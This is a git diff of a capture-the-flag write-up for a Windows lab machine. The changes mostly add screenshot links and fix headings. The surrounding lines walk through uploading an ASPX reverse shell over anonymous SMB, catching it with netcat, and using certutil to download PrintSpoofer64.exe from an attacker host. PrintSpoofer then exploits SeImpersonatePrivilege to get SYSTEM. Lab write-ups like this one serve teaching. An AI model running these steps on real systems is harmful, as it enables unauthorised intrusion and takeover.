@@ -151,7 +151,10 @@ gobuster dir -u http://10.201.66.41:49663 -w /usr/share/wordlists/dirb/common.tx
  I manually appended it to the URL to test if it was accessible.
 
 http://10.201.66.41:49663/nt4wrksv/passwords.txt
-##Screenshot: screenshots/07_passwords_web.png
+
+📷 **Screenshot:**  
+
+![vulnerability spotted](./Screenshots/Vulnerability_spotted.png)
 
 ### Result:
  - The contents of "passwords.txt" were displayed through the webserver.
@@ -185,6 +188,10 @@ smbclient //10.201.66.41/nt4wrksv -N
 put shell.aspx
 ```
 
+📷 **Screenshot:**
+
+![Msfvenom](./Screenshots/Msfveno_command_1.png)
+
 ### 3️⃣ Starting a Netcat Listener
 
 To catch the reverse shell, I started a listener on port 4444:
@@ -196,17 +203,23 @@ nc -lvnp 4444
 
 Next, I navigated to the uploaded payload via the webserver:
 
+```
 http://10.201.66.41:49663/nt4wrksv/shell.aspx
+```
 
-
-📷 Screenshot (empty page when payload executed)
+ 📷 **Screenshot:**  
+ 
+![shell.aspsx_page](./Screenshots/shell.aspx_server.png)
 
 ## ✅ Result: Gained Shell
 
 As soon as I accessed the payload, the connection was established back to my listener.
 I successfully obtained a reverse shell on the target system.
 
-📷 Screenshot (reverse shell obtained)
+📷 **Screenshot:**   
+
+![we got shell](./Screenshots/WE_got_the_shell_1.png)
+
 ---
 
 
@@ -219,9 +232,11 @@ I used the following command inside the Windows shell:
 ```bash
 whoami /priv
 ```
-📷 Screenshot (privilege enumeration output)
+📷 **Screenshot:**  
 
-🔎 Findings
+![privilege enumeration output](./Screenshots/Whoami_1.png)
+
+### 🔎 Findings
 From the output, I observed that the SeImpersonatePrivilege was Enabled.
 
 Privilege: SeImpersonatePrivilege
@@ -230,7 +245,7 @@ Description: Allows impersonation of a client after authentication.
 
 Significance: This privilege is often abused for privilege escalation attacks such as Juicy Potato, PrintSpoofer, or Rogue Potato, which can allow escalation to SYSTEM.
 
-✅ Conclusion
+### ✅ Conclusion
 The presence of SeImpersonatePrivilege (Enabled) indicated that the system was vulnerable to a known privilege escalation technique.
 This gave me a clear path forward to attempt SYSTEM-level access.
 ---
@@ -247,7 +262,9 @@ On my Kali machine, I hosted the PrintSpoofer64.exe exploit using a simple Pytho
 python3 -m http.server 80
 ```
 
-📷 Screenshot (showing PrintSpoofer64.exe in my Kali directory and Python HTTP server running)
+📷 **Screenshot:**  
+
+![port 80](./Screenshots/Printspoofer_exe_1.png)
 
 ### 2️⃣ Transferring the Exploit to Target Machine
 
@@ -256,7 +273,10 @@ On the target machine, I used certutil (a built-in Windows utility) to download 
 certutil -urlcache -f http://<attacker-ip>/PrintSpoofer64.exe PrintSpoofer64.exe
 ```
 
-📷 Screenshot (showing successful transfer of the file)
+📷 **Screenshot:**  
+
+![transfer](./Screenshots/printspoofer_1.png)
+
 
 ### 3️⃣ Executing the Exploit
 
@@ -265,7 +285,9 @@ Next, I ran the exploit to spawn a privileged command shell:
 PrintSpoofer64.exe -i -c cmd.exe
 ```
 
-📷 Screenshot (showing SeImpersonatePrivilege exploited and elevated shell obtained)
+📷 **Screenshot:**  
+
+![got system](./Screenshots/got_system_1.png)
 
 ### ✅ Result
 
@@ -276,6 +298,7 @@ By leveraging PrintSpoofer64.exe, I successfully escalated privileges and obtain
 
 
 ## 🏁 Step 8: Capturing the Flags
+
 ### 1️⃣ Root Flag
 
 With SYSTEM-level access, I navigated to the Administrator’s Desktop and retrieved the root.txt file:
@@ -283,7 +306,9 @@ With SYSTEM-level access, I navigated to the Administrator’s Desktop and retri
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-📷 Screenshot (showing the root flag)
+📷 **Screenshot:**  
+
+![root flag](./Screenshots/Root.txt_1.png)
 
 ### ✅ Successfully captured the Root Flag.
 
@@ -294,7 +319,9 @@ Similarly, the User Flag was found in the Bob user’s Desktop directory:
 type C:\Users\Bob\Desktop\user.txt
 ```
 
-📷 Screenshot (optional, showing the user flag)
+📷 **Screenshot:**  
+
+![user flag](./Screenshots/User.txt_1.png)
 
 ### ✅ Successfully captured the User Flag.
 
